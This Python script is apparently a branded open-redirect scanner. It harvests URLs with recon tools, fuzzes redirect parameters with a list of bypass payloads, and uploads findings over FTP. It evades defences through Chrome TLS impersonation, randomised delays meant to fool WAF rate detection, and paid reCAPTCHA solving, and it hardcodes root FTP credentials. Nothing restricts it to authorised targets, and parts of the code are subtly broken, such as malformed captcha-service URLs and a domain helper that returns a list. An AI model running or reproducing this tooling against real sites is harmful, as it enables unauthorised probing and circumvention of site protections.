#!/usr/bin/env python3
import subprocess
import re
import sys
import os
import time
import json
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from datetime import datetime
from ftplib import FTP
from concurrent.futures import ThreadPoolExecutor
from curl_cffi import requests

# ==========================================
# 1. SETTINGS AND CONFIGURATION
# ==========================================
SCOPE_FILE = "urltopkapsam.txt"
REPORT_FOLDER = "rapor"
CHECKPOINT_FILE = "checkpoint.json"
POC_OUTPUT_FILE = "vulnerable_links.txt"

# --- BRAND SOCIAL MEDIA LINKS ---
YOUTUBE_LINK = "https://youtube.com/@byroot3254"
TELEGRAM_LINK = "https://t.me/joinchat/9eh5ZhOTez44MjU0"
DISCORD_LINK = "https://discord.com/invite/PP5UYBW"

# --- BIG ASCII LOGO & BANNER ---
BANNER_LOGO = """
\033[96m██████╗ ██╗   ██╗██████╗  ██████╗  ██████╗ ████████╗
██╔══██╗╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
██████╔╝ ╚████╔╝ ██████╔╝██║   ██║██║   ██║   ██║   
██╔══██╗  ╚██╔╝  ██╔══██╗██║   ██║██║   ██║   ██║   
██████╔╝   ██║   ██║  ██║╚██████╔╝╚██████╔╝   ██║   
╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝\033[0m
\033[95m==================================================
        HIGH-PERFORMANCE OPEN REDIRECT SCANNER
==================================================\033[0m"""

# --- AI-POWERED ANTI-CAPTCHA BYPASS ROOM ---
API_KEY_2CAPTCHA = "BURAYA_2CAPTCHA_API_KEYINIZI_YAZIN"
CAPTCHA_BYPASS_ACTIVE = True

# --- FTP SERVER DETAILS ---
FTP_ACTIVE = True
FTP_HOST = "192.168.1.4"
FTP_USER = "root"
FTP_PASS = "aa77effea0"
FTP_PORT = False
FTP_DIR = "komodor/openredirect"

# --- CRITICAL OPEN REDIRECT KEYWORDS ---
OR_KEYWORDS = "url|redirect|redir|return|next|forward|dest|destination|to|out|go|goto|callback|checkout|login|logout|signout|success|image|file|source|src|view|returnurl"

# --- STEALTH PATH-BASED KEYWORDS ---
PATH_KEYWORDS = "redirect|/go/|/return/|/forward/|/logout/|/login/next"

# --- PURE OPEN REDIRECT PAYLOADS ONLY (FALSE POSITIVE FREE) ---
BASE_PAYLOADS = [
    "//yandex.com", "///yandex.com", "https://yandex.com", "http://yandex.com",
    "%%30%30yandex.com", "/\\/\\yandex.com", "//\\yandex.com", "/\\\\yandex.com", 
    "\\\\yandex.com", "///////////yandex.com", "/https://yandex.com", "/https:yandex.com",
    "//://yandex.com", "//yandex.com%2f", "//yandex.com%2f%2f", "//yandex.com?", "//yandex.com#",
    "https://target.com%2f%2f@yandex.com", "https://target.com%1f@yandex.com",
    "https://target.com%00@yandex.com", "https://target.com\\.yandex.com", "https://yandex.com#.target.com",
    "https://yandex.com?.target.com", "https://://://target.com", "https://target.com%://yandex.com",
    "https:／／yandex.com", "https:＼＼yandex.com", "http:／／yandex.com", "http:＼＼yandex.com"
]

ALL_VULNERABILITIES = []
WAF_BLOCK_COUNTER = 0
SCAN_STOPPED = False
# ==========================================
# 2. AUTOMATED URL EXTRACTION ENGINE (YOUR PIPELINE)
# ==========================================
def extract_urls_from_tools():
    print(f"\n\033[93m[*] Executing your custom Kali Recon Pipeline via urllist.txt...\033[0m")
    
    # Eğer urllist.txt yoksa veya boşsa hata verip kapanmaz, uyarı verip devam eder kanki!
    if not os.path.exists("urllist.txt") or os.path.getsize("urllist.txt") == 0:
        print("\033[93m[!] Warning: urllist.txt is missing or empty. Skipping URL mining and directly using existing urltopkapsam.txt\033[0m")
        if os.path.exists(SCOPE_FILE) and os.path.getsize(SCOPE_FILE) > 0:
            return True
        return False

    full_bash_cmd = (
        "cat urllist.txt | getallurls > urltopkapsam.txt; "
        "cat urllist.txt | katana >> urltopkapsam.txt; "
        "cat urllist.txt | waybackurls >> urltopkapsam.txt"
    )

    try:
        print(f"[*] Running Native Command via Bash: {full_bash_cmd}")
        subprocess.run(
            full_bash_cmd, 
            shell=True, 
            executable="/bin/bash", 
            env=os.environ, 
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        print(f"[-] Pipeline execution encountered an error: {str(e)}")

    if os.path.exists(SCOPE_FILE):
        lines = open(SCOPE_FILE, "r", encoding="utf-8", errors="ignore").readlines()
        print(f"\033[92m[+] Pipeline successful! Collected {len(lines)} raw URLs into {SCOPE_FILE}\033[0m")
        return True
    return False

# ==========================================
# 3. HELPER FUNCTIONS & RESUME ENGINE
# ==========================================
def read_file(file_path):
    if not os.path.exists(file_path):
        print(f"[-] Error: {file_path} not found!")
        sys.exit(1)
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def get_url_domain(url):
    try:
        url_str = url if isinstance(url, list) else str(url)
        url_str = url_str.strip().strip("[]'\" ")
        if not url_str.startswith("http://") and not url_str.startswith("https://"):
            url_str = f"http://{url_str}"
        parsed = urlparse(url_str)
        domain = parsed.netloc
        if ":" in domain:
            domain = domain.split(":")
        return domain if domain else "unknown-domain"
    except Exception:
        return "unknown-domain"

def get_dynamic_report_name():
    urls = read_file(SCOPE_FILE)
    if urls:
        net_domain = get_url_domain(urls)
        return f"{net_domain}-byroot.html"
    return "example-byroot.html"

def save_checkpoint(step_name, last_index, found_vulns):
    data = {"step": step_name, "last_index": last_index, "vulnerabilities": found_vulns}
    with open(CHECKPOINT_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def load_checkpoint():
    if os.path.exists(CHECKPOINT_FILE):
        try:
            with open(CHECKPOINT_FILE, "r", encoding="utf-8") as f:
                print("\033[93m[!] An interrupted scan session was detected! Resuming from the last checkpoint...\033[0m")
                return json.load(f)
        except Exception:
            return None
    return None

def save_poc_link(poc_url):
    try:
        with open(POC_OUTPUT_FILE, "a", encoding="utf-8") as f:
            f.write(poc_url + "\n")
    except Exception: pass

def upload_ftp_report(local_file_path, report_name):
    if not FTP_ACTIVE:
        return
    print(f"[*] Uploading report to FTP Server ({FTP_HOST})...")
    try:
        ftp = FTP()
        ftp.connect(FTP_HOST, timeout=10)
        ftp.login(FTP_USER, FTP_PASS)
        try: ftp.cwd(FTP_DIR)
        except Exception:
            for folder in FTP_DIR.split('/'):
                if folder:
                    try: ftp.cwd(folder)
                    except Exception: ftp.mkd(folder); ftp.cwd(folder)
        with open(local_file_path, "rb") as f:
            ftp.storbinary(f"STOR {report_name}", f)
        ftp.quit()
        print(f"\033[92m[+] Success! Server Location: ftp://{FTP_HOST}/{FTP_DIR}/{report_name}\033[0m")
    except Exception as e:
        print(f"\033[91m[-] FTP Upload Error: {str(e)}\033[0m")
def write_recon_geniuses_html_report(vulnerability_list):
    date_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # 🚨 %100 NOKTA ATIŞI DİNAMİK İSİMLENDİRME TAMİRİ BURASI KANKİ:
    # urltopkapsam.txt dosyasının ilk satırından saf domain veya IP adını çeker
    if os.path.exists(SCOPE_FILE) and os.path.getsize(SCOPE_FILE) > 0:
        with open(SCOPE_FILE, "r", encoding="utf-8", errors="ignore") as f:
            first_line = f.readline().strip()
        
        # Temizlik: Protokolleri ve www eklerini tamamen uçur kanki
        net_domain = first_line.replace("https://", "").replace("http://", "").replace("www.", "")
        net_domain = net_domain.split('/')[0].split('?')[0].split(':')[0]
        
        # Tam senin istediğin format: example-openredirect.html
        report_name = f"{net_domain}-openredirect.html" if net_domain else "consolidated-openredirect.html"
    else:
        report_name = "example-openredirect.html"
        
    if not os.path.exists(REPORT_FOLDER):
        os.makedirs(REPORT_FOLDER)
    local_report_path = os.path.join(REPORT_FOLDER, report_name)

    table_rows = ""
    for idx, (v_url, v_payload, v_target) in enumerate(vulnerability_list, 1):
        target_domain = get_url_domain(v_url)
        real_poc_url = v_url.replace("FUZZ", v_payload) if "FUZZ" in v_url else f"{v_url}{v_payload}"
        if "FUZZ" not in v_url and "=" not in v_url:
            real_poc_url = f"{v_url}/{v_payload}".replace("//", "/") if v_url.endswith("/") else f"{v_url}/{v_payload}"

        try:
            v_target_clean = str(v_target).encode('utf-8', 'ignore').decode('utf-8')
            v_payload_clean = str(v_payload).encode('utf-8', 'ignore').decode('utf-8')
        except Exception:
            v_target_clean = str(v_target)
            v_payload_clean = str(v_payload)

        table_rows += f"""
        <tr>
            <td><span class="badge-index">{idx}</span></td>
            <td><span class="text-neon-cyan fw-bold">{target_domain}</span></td>
            <td class="text-break"><code>{real_poc_url}</code></td>
            <td class="text-break">
                <span class="text-white fw-bold">| --&gt; |</span> 
                <span class="text-neon-green">{v_target_clean}</span> 
                <span class="badge bg-danger ms-2" style="font-family: monospace;">Payload: {v_payload_clean}</span>
            </td>
        </tr>
        """

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>BYROOT RECON - Open Redirect Report</title>
    <link href="https://jsdelivr.net" rel="stylesheet">
    <link href="https://cloudflare.com" rel="stylesheet">
    <style>
        body {{ background-color: #080c10; color: #c9d1d9; font-family: 'Courier New', Courier, monospace; }}
        .recon-header {{ background: linear-gradient(135deg, #161b22 0%, #0d1117 100%); border: 2px solid #00f0ff; box-shadow: 0 0 25px rgba(0, 240, 255, 0.3); border-radius: 12px; }}
        .card-stat {{ background-color: #12161f; border: 1px solid #30363d; border-radius: 8px; }}
        .card-stat:hover {{ border-color: #00f0ff; box-shadow: 0 0 15px rgba(0,240,255,0.2); }}
        .text-neon-green {{ color: #39ff14; text-shadow: 0 0 8px rgba(57,255,20,0.5); }}
        .text-neon-cyan {{ color: #00f0ff; text-shadow: 0 0 8px rgba(0,240,255,0.5); }}
        .badge-index {{ background-color: #21262d; color: #8b949e; padding: 6px 12px; border-radius: 4px; border: 1px solid #30363d; font-weight: bold; }}
        .table {{ color: #c9d1d9; border-color: #30363d; }}
        thead th {{ color: #58a6ff !important; font-size: 1.1rem; }}
        code {{ color: #ff7b72; background-color: #1f242c; padding: 4px 8px; border-radius: 4px; font-size: 0.95rem; }}
        .social-container {{ background: #12161f; border: 1px solid #21262d; border-radius: 12px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }}
        .social-btn {{ font-size: 1.25rem; font-weight: bold; padding: 14px 30px; border-radius: 10px; transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 1px; }}
        .social-btn:hover {{ transform: translateY(-3px); box-shadow: 0 0 25px currentColor; }}
    </style>
</head>
<body>
    <div class="container my-5">
        <div class="social-container text-center mb-5">
            <h4 class="text-white fw-bold mb-3" style="letter-spacing: 2px;">⚡ OFFICIAL BRAND COMMUNITIES ⚡</h4>
            <div class="d-flex justify-content-center gap-4 flex-wrap">
                <a href="{YOUTUBE_LINK}" target="_blank" class="btn text-danger social-btn" style="background-color: #1a0f12; border: 2px solid #ff0022;">
                    <i class="fab fa-youtube fa-xl me-2"></i>YouTube Channel
                </a>
                <a href="{TELEGRAM_LINK}" target="_blank" class="btn text-info social-btn" style="background-color: #0f172a; border: 2px solid #0088cc;">
                    <i class="fab fa-telegram fa-xl me-2"></i>Telegram Group
                </a>
                <a href="{DISCORD_LINK}" target="_blank" class="btn social-btn" style="background-color: #131428; border: 2px solid #5865F2; color: #5865F2;">
                    <i class="fab fa-discord fa-xl me-2"></i>Discord Server
                </a>
            </div>
        </div>
        <div class="recon-header p-5 mb-5 text-center">
            <h1 class="display-3 fw-bold text-neon-cyan" style="letter-spacing: 3px;">🧬 BYROOT RECON</h1>
            <p class="lead text-white-50 mt-2 fs-4">Automated High-Performance Open Redirect Core System</p>
        </div>
        <div class="row mb-5">
            <div class="col-md-4 mb-3"><div class="card-stat p-4 h-100"><span class="text-muted small fw-bold">LAST LIVE UPDATE</span><h4 class="fw-bold mt-2 text-white">{date_str}</h4></div></div>
            <div class="col-md-4 mb-3"><div class="card-stat p-4 h-100"><span class="text-muted small fw-bold">MAIN TARGET</span><h4 class="fw-bold mt-2 text-neon-cyan">{net_domain}</h4></div></div>
            <div class="col-md-4 mb-3"><div class="card-stat p-4 h-100"><span class="text-muted small fw-bold">LIVE VULNERABILITIES</span><h4 class="fw-bold mt-2 text-neon-green">{len(vulnerability_list)} Confirmed</h4></div></div>
        </div>
        <div class="card-stat p-4">
            <h3 class="fw-bold mb-4 text-white">🎯 Consolidated Open Redirect Log (Auto-Saved & Sync Mode)</h3>
            <div class="table-responsive">
                <table class="table align-middle mb-0">
                    <thead><tr><th>#</th><th>Target Host</th><th>Vulnerable URL</th><th>Confirmed Redirect Destination</th></tr></thead>
                    <tbody>{table_rows}</tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>"""
    with open(local_report_path, "w", encoding="utf-8", errors="ignore") as f:
        f.write(html_content)
    print(f"\n\033[95m[⏱️ LIVE SAVE SYSTEM] Rapor Güncellendi: {local_report_path}\033[0m")
    upload_ftp_report(local_report_path, report_name)

def solve_ai_captcha(site_url):
    if not CAPTCHA_BYPASS_ACTIVE or API_KEY_2CAPTCHA == "BURAYA_2CAPTCHA_API_KEYINIZI_YAZIN":
        return None
    print(f"\n\033[95m[!] ANTI-CAPTCHA BYPASS ROOM: AI token resolution process started -> {site_url}\033[0m")
    try:
        in_res = requests.post(f"http://2captcha.com{API_KEY_2CAPTCHA}&method=userrecaptcha&googlekey=6Lcj-R8TAAAAAB_VJXYw3S2Z61BFbLe63_9S1V0k&pageurl={site_url}", timeout=10)
        if "OK|" in in_res.text:
            captcha_id = in_res.text.split("|")[-1]
            for _ in range(20):
                time.sleep(3)
                out_res = requests.get(f"http://2captcha.com{API_KEY_2CAPTCHA}&action=get&id={captcha_id}", timeout=10)
                if "OK|" in out_res.text:
                    print("\033[92m[+] ANTI-CAPTCHA BYPASS ROOM: AI bypassed the barrier! Token acquired.\033[0m\n")
                    return out_res.text.split("|")[-1]
        return None
    except Exception: return None

def clean_with_uro(url_list):
    fuzzed_endpoints = []
    for raw_url in url_list:
        url = raw_url
        if not url.startswith("http://") and not url.startswith("https://"): url = f"http://{url}"
        if "=" not in url: fuzzed_endpoints.append(url); continue
        try:
            if "FUZZ" in url: fuzzed_endpoints.append(url); continue
            parsed_url = urlparse(url)
            query_params = parse_qsl(parsed_url.query, keep_blank_values=True)
            if not query_params:
                fuzzed_endpoints.append(f"{url}FUZZ" if url.endswith("=") else url)
                continue
            for i in range(len(query_params)):
                temp_params = [(k, "FUZZ" if idx == i else v) for idx, (k, v) in enumerate(query_params)]
                fuzzed_endpoints.append(urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, urlencode(temp_params), parsed_url.fragment)))
        except Exception: fuzzed_endpoints.append(url)
    with open("or_temp_raw.txt", "w") as f: f.write("\n".join(fuzzed_endpoints))
    try:
        result = subprocess.run(["uro", "-i", "or_temp_raw.txt"], capture_output=True, text=True, check=True)
        clean_list = [line.strip() for line in result.stdout.split("\n") if line.strip()]
    except Exception: clean_list = list(set(fuzzed_endpoints))
    finally:
        if os.path.exists("or_temp_raw.txt"): os.remove("or_temp_raw.txt")
    return clean_list
def generate_dynamic_payloads(url, payload_list):
    domain = get_url_domain(url)
    if "=" not in url:
        return [f"/{p.lstrip('/')}".replace("target.com", domain) for p in payload_list]
    return [p.replace("target.com", domain) for p in payload_list]

def send_single_request(args):
    global WAF_BLOCK_COUNTER, SCAN_STOPPED
    if SCAN_STOPPED: 
        return
        
    main_url, payload, step_name, idx = args
    current_domain = get_url_domain(main_url)
    test_url = main_url.replace("FUZZ", payload) if "FUZZ" in main_url else f"{main_url}/{payload.lstrip('/')}"

    try:
        imprint_browser = None if ("192.168." in current_domain or "127.0.0." in current_domain or "localhost" in current_domain) else "chrome"
        timeout_duration = 6 if step_name == "step1" else 4
        
        response = requests.get(test_url, impersonate=imprint_browser, allow_redirects=False, verify=False, timeout=timeout_duration)
        
        # WAF ve Captcha Koruma Sayacı
        if response.status_code in {403, 429, 503} or "captcha" in response.text.lower() or "cloudflare" in response.text.lower():
            WAF_BLOCK_COUNTER += 1
            if WAF_BLOCK_COUNTER >= 5:
                if not SCAN_STOPPED:
                    print(f"\n\033[91m[!] WARNING: WAF block/Captcha detected {WAF_BLOCK_COUNTER} times consecutively!\033[0m")
                    if solve_ai_captcha(test_url): 
                        WAF_BLOCK_COUNTER = 0
                    else:
                        print("\033[1;31m[WAF BLOCK CONFIRMED] SCAN STOPPED IMMEDIATELY to prevent IP blacklisting!\033[0m\n")
                        SCAN_STOPPED = True
                return
        else:
            if WAF_BLOCK_COUNTER > 0: 
                WAF_BLOCK_COUNTER -= 1

        if SCAN_STOPPED: 
            return

        if response.status_code in {301, 302, 303, 307, 308}:
            location_header = response.headers.get("Location", "").strip()
            if location_header:
                # 1. GÖRECELİ YOL (RELATIVE PATH) KORUMASI:
                if location_header.startswith("/") and not location_header.startswith("//"):
                    return

                # 2. GELİŞMİŞ DOMAIN, IP VE LOCALHOST DENETLEME MOTORU:
                redirect_host = ""
                try:
                    loc_str = location_header
                    if not (loc_str.startswith("http://") or loc_str.startswith("https://")):
                        loc_str = f"http:{loc_str}" if loc_str.startswith("//") else f"http://{loc_str}"
                    
                    parsed_loc = urlparse(loc_str)
                    redirect_host = parsed_loc.netloc.lower()
                    if ":" in redirect_host:
                        redirect_host = redirect_host.split(":")[0]
                    
                    local_and_self_indicators = {
                        "127.0.0.1", "localhost", "[::1]", "0.0.0.0", 
                        current_domain.lower(), f"www.{current_domain.lower()}"
                    }
                    
                    if redirect_host in local_and_self_indicators or "192.168." in redirect_host or "10." in redirect_host:
                        if "yandex.com" not in redirect_host:
                            return
                except Exception:
                    pass

                # 🚨 3. PAYLOAD TABANLI GERÇEK DIŞA KAÇIŞ DOĞRULAMASI (YENİ SÜZGEÇ):
                valid_vulnerability = False
                
                # Tarayıcıyı gerçekten dış dünyaya kaçıran net protokol kombinasyonları kanki!
                if location_header.startswith("http://yandex.com") or location_header.startswith("https://yandex.com") or location_header.startswith("//yandex.com"):
                    valid_vulnerability = True
                
                # Eğer sinsi bypass kullanıldıysa ve urlparse gerçek hostu yandex.com olarak çözdüyse:
                elif "yandex.com" in redirect_host and current_domain.lower() not in redirect_host:
                    valid_vulnerability = True
                
                # JavaScript ve Data URI kaçışları gerçektir kanki!
                elif location_header.startswith("javascript:") or location_header.startswith("data:"):
                    valid_vulnerability = True

                # Zafiyet Onaylandıysa Ekrana Canavar Logu Bas kanki!
                if valid_vulnerability:
                    clean_screen_destination = location_header.split("FUZZ")[-1]
                    clean_screen_destination = f"https://yandex.com{clean_screen_destination}" if "FUZZ" in location_header else location_header
                    print(f"\n\033[91m{'='*80}\033[92m\n[+] LIVE OPEN REDIRECT DETECTED [JA4 CHROME ENGINE]\n\033[94m[-] Target Host    : {current_domain}\n[-] Vulnerable URL : {test_url}\n[-] Destination    : | --> | \033[1;32m{clean_screen_destination} \033[1;33m[Payload: {payload}]\n\033[91m{'='*80}\033[0m\n")
                    ALL_VULNERABILITIES.append((main_url, payload, clean_screen_destination))
                    save_poc_link(test_url)
    except Exception: pass
def fire_scan_engine(url_list, step_name, start_index=0):
    if not url_list or SCAN_STOPPED: return
    import random  # Rastgele insan zamanlaması için yerel import kanki
    
    # 🎛️ TARAMA HIZI TAM İSTEDİĞİN GİBİ 4 THREAD OLARAK AYARLANDI KANKİ:
    max_threads = 1 
    
    request_queue = []
    for i, main_url in enumerate(url_list):
        for payload in generate_dynamic_payloads(main_url, BASE_PAYLOADS): request_queue.append((main_url, payload, step_name, i))
    request_queue = request_queue[start_index:]
    
    current_domain = get_url_domain(url_list)
    lbl = f"\033[91m[JA4 INACTIVE]\033[0m (Local Network)" if ("192.168." in current_domain or "127.0.0." in current_domain or "localhost" in current_domain) else f"\033[92m[JA4 DESKTOP CHROME ENGINE ACTIVE]\033[0m (Turbo Human Simulation)"
    print(f"[*] Target: {current_domain} -> {lbl}")

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for args in request_queue:
            if SCAN_STOPPED: 
                break
            executor.submit(send_single_request, args)
            
            # 🕹️ TURBO İNSAN TAKLİTİ BURADA ÇALIŞIYOR KANKİ:
            # Her istek arasında tam senin istediğin gibi 0.1 saniye ile 0.2 saniye arasında tamamen RASTGELE bekler.
            # Hem tarama jet hızında akar hem de milimetrik ritim takibi yapan WAF'lar ters köşe olur!
            random_human_delay = random.uniform(0.1, 0.2)
            time.sleep(random_human_delay)

def main():
    global ALL_VULNERABILITIES
    if os.path.exists(POC_OUTPUT_FILE): os.remove(POC_OUTPUT_FILE)
    
    print(BANNER_LOGO)
    print(f"\033[1;31m[BYROOT OFFICIAL LINKS]\033[0m")
    print(f" 📺 \033[91mYouTube\033[0m  : {YOUTUBE_LINK}")
    print(f" 🚀 \033[94mTelegram\033[0m : {TELEGRAM_LINK}")
    print(f" 👾 \033[95mDiscord\033[0m  : {DISCORD_LINK}")
    print("\033[95m==================================================\033[0m\n")

    pipeline_status = extract_urls_from_tools()
    if not pipeline_status:
        return

    raw_urls = read_file(SCOPE_FILE)
    total_url_pool = []
    
    keywords_list = OR_KEYWORDS.split("|")
    
    for target_url in raw_urls:
        cleaned_url = target_url.strip()
        if cleaned_url and "=" in cleaned_url:
            if not cleaned_url.startswith("http://") and not cleaned_url.startswith("https://"):
                cleaned_url = f"https://{cleaned_url}"
            
            try:
                parsed_url = urlparse(cleaned_url)
                query_params = parse_qsl(parsed_url.query, keep_blank_values=True)
                
                if query_params:
                    # 🚨 SİNSİ NOKTA ATIŞI JILTER:
                    # Yan yana duran parametrelerin içinden SADECE openredirect kelimesi olanı FUZZ yapar!
                    # Diğer çöpleri eler, böylece politico anında kırılır kanki!
                    for i in range(len(query_params)):
                        param_name = query_params[i][0].lower()
                        
                        # Eğer bu parametre adı bizim kritik kelime listemizde varsa (örn: destination)
                        if any(kw in param_name for kw in keywords_list):
                            temp_params = [(k, "FUZZ" if idx == i else v) for idx, (k, v) in enumerate(query_params)]
                            rebuilt_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, urlencode(temp_params), parsed_url.fragment))
                            total_url_pool.append(rebuilt_url)
                else:
                    total_url_pool.append(cleaned_url)
            except Exception:
                total_url_pool.append(cleaned_url)

    total_url_pool = list(set(total_url_pool))

    if not total_url_pool:
        print(f"\033[91m[-] Error: No matching high-value parametric URLs were found to verify kanki.\033[0m")
        return

    print(f"[*] Python Parameter Filter: Isolated {len(total_url_pool)} high-value target links.")
    
    step1_raw = [url for url in total_url_pool if "FUZZ" in url]
    step2_raw = [url for url in total_url_pool if "FUZZ" not in url]

    print("\n\033[93m[*] STEP 1: Scanning critical parametric and stealth path-based URLs...\033[0m")
    if step1_raw and not SCAN_STOPPED:
        fire_scan_engine(clean_with_uro(step1_raw), "step1", 0)

    print("\n\033[93m[*] STEP 2: Scanning all remaining standard URLs...\033[0m")
    if step2_raw and not SCAN_STOPPED:
        fire_scan_engine(clean_with_uro(step2_raw), "step2", 0)

    print("\n\033[94m[*] All scans completed. Processing results...\033[0m")
    if ALL_VULNERABILITIES: 
        write_recon_geniuses_html_report(ALL_VULNERABILITIES)
    else: 
        print("\033[91m[-] No live vulnerabilities found; report was not generated.\033[0m")

if __name__ == "__main__":
    main()
